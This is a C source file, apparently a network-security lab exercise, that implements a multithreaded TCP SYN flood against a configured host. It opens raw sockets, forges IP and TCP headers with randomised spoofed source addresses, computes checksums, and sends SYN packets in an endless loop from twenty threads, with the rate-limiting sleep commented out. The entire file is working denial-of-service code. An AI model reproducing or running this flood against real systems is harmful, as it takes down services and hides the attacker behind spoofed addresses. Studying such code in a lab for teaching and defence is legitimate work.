/*
 *  Created on: May 4, 2016
 *      Author: jiaziyi
 *  Changed on: Julu 23, 2024
 * 		Author: Chengqi Liu
 * 
 */


#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
#include <pthread.h>

#include "header.h"

// #define fake SRC_IP and SRC_PORT
#define SRC_IP  "255.255.255.255"
#define SRC_PORT 54321
// #define DEST_IP and DEST_PORT
#define DEST_IP "192.168.56.101"
#define DEST_PORT 2000 //set the destination port here
#define TEST_STRING "test data" //a test string as packet payload
#define INTERVAL 1	//Interval seconds for sending SYN packets
#define PACK_LENGTH 65536
#define NTHREADS 20 //number of threads to launch the attack

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

void SYN_flood(){
	//create socket
	int fd=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(fd < 0){
		perror("Error creating raw socket ");
		exit(1);
	}

	int hincl=1;  // 1=on, 0=off
	setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	char source_ip[]=SRC_IP;
	char dest_ip[]=DEST_IP;

	unsigned long long num=0; //number of sending SYN
	while(1){

		//Set a random source IP
		sprintf(source_ip, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);

		char packet[PACK_LENGTH], *data;
		char data_string[]=TEST_STRING;
		memset(packet, 0, PACK_LENGTH);

		//IP header pointer
		struct iphdr *iph=(struct iphdr *)packet;

		//TCP header pointer
		struct tcphdr *tcph=(struct tcphdr *)(packet + sizeof(struct iphdr));
		struct pseudo_tcp_header psh; //pseudo header

		//data section pointer
		data=packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

		//fill the data section
		strncpy(data, data_string, strlen(data_string));
		
		//convert the ip address
		u_int32_t src_addr, dst_addr;
		int ret=inet_pton(AF_INET,(const char *)source_ip,(void *)&src_addr);
		if(ret<0){
			perror("Could not identify source ip address.");
			exit(1);
		}
		ret=inet_pton(AF_INET,(const char *)dest_ip,(void *)&dst_addr);
		if(ret<0){
			perror("Could not identify destination ip address.");
			exit(1);
		}

		//convert the port
		u_int16_t src_port=htons(SRC_PORT);
		u_int16_t dst_port=htons(DEST_PORT);

		//fill the IP header here. This part is similar to tutorial 4a.
		iph->version=4;
		iph->ihl=5;
		iph->tos=0;
		iph->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(data_string);
		iph->id=1234;
		iph->frag_off=0;
		iph->ttl=255;
		iph->protocol=6; //6 for TCP and 17 for UDP.
		iph->saddr=src_addr;
		iph->daddr=dst_addr;
		iph->check=checksum((unsigned short*)iph,sizeof(struct iphdr));

		//fill the TCP header.
		//refered https://networklessons.com/cisco/ccie-routing-switching-written/tcp-header .
		tcph->source=src_port;
		tcph->dest=dst_port;
		tcph->seq=htonl(rand() % 4294967295);
		tcph->ack_seq=htonl(0);
		tcph->doff=5;
		tcph->urg=0;
		tcph->ack=0;
		tcph->psh=0;
		tcph->rst=0;
		tcph->syn=1;
		tcph->fin=0;
		tcph->window=htons(5840);
		tcph->urg_ptr=0;

		//fill the pseudo TCP header
		//refered https://www.baeldung.com/cs/pseudo-header-tcp .
		psh.source_address=src_addr;
		psh.dest_address=dst_addr;
		psh.placeholder=0;
		psh.protocol=6;
		psh.tcp_length=htons(sizeof(struct tcphdr)+strlen(data_string));

		//construct the pseudo TCP datagram
		int pseudo_tcp_length=sizeof(struct pseudo_tcp_header)+sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(data_string);
		char *pseudo_tcp_gram=malloc(pseudo_tcp_length);
		memcpy(pseudo_tcp_gram,&psh,sizeof(struct pseudo_tcp_header));
		memcpy(pseudo_tcp_gram+sizeof(struct pseudo_tcp_header),packet,sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(data_string));
		
		tcph->check=checksum((unsigned short*)pseudo_tcp_gram,pseudo_tcp_length);

		//fill in destination port and address
		struct sockaddr_in dest;
		dest.sin_family=AF_INET;
		dest.sin_port=dst_port;
		dest.sin_addr.s_addr=dst_addr;

		free(pseudo_tcp_gram);

		//send the packet
		++num;
		if (sendto (fd,packet,sizeof(struct iphdr)+sizeof(struct tcphdr)+strlen(data_string),0,(struct sockaddr*)&dest,sizeof(dest))<0){
			printf("Failed to send.");
		}

		pthread_mutex_lock(&mutex);
		printf("Thread: %ld, Number of SYN package sent: %lld\n",pthread_self(),num);
		pthread_mutex_unlock(&mutex);

		//Make it slower for debug.
		// sleep(INTERVAL);

	}

	close(fd);

	return;
}

int main(int argc, char *argv[]){
	pthread_t threads[NTHREADS];
    int i;
    //attack
    for(i=0;i<NTHREADS;++i){
        if(pthread_create(&threads[i], NULL, (void *)SYN_flood, NULL)){
			fprintf(stderr, "Error creating thread\n");
			return -1;
		}
    }

    //join the NTHREADS threads
	for(i=0;i<NTHREADS;++i){
		pthread_join(threads[i], NULL);
	}
		
	
	return 0;

}
